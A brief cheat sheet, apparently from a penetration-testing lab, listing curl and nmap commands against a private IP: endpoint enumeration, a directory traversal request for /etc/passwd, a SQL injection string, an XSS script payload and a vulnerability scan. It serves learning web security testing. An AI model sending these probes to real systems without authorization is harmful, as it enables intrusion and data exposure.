
        Curl

'Curl' is  a powerful tool for web develpoers , system administrators , and anyone needing to interact with web services or API.
PURPOSE: Transfer data to or from a server.


Action	                                       Command                                                                              	Purpose
Check Common Endpoints	              curl -X GET http://10.10.206.99/{path}	                                              Find hidden or useful paths.
Test for Directory Traversal      	  curl -X GET http://10.10.206.99/../../etc/passwd	                                    Check for path traversal vulnerabilities.
Test for SQL Injection	              curl -X GET http://10.10.206.99/search?query=1' OR '1'='1	                            Test for SQL injection vulnerabilities.
Test for XSS	                        curl -X GET "http://10.10.206.99/search?query=<script>alert('XSS')</script>"	        Check for XSS vulnerabilities.
Look for API Endpoints	              curl -X GET http://10.10.206.99/api	                                                  Search for API endpoints.
Scan for Vulnerabilities              nmap --script vuln http://10.10.206.99                                 	              Use Nmap for vulnerability scanning.
Run Web Application Scanner           Use OWASP ZAP or Burp Suite	                                                          Automate the discovery of vulnerabilities.
Enumerate Technologies               	curl -I http://10.10.206.99	                                                          Find out server technologies used.
Check for robots.txt                 	curl -X GET http://10.10.206.99/robots.txt                                           	Look for directories or files that should be disallowed.
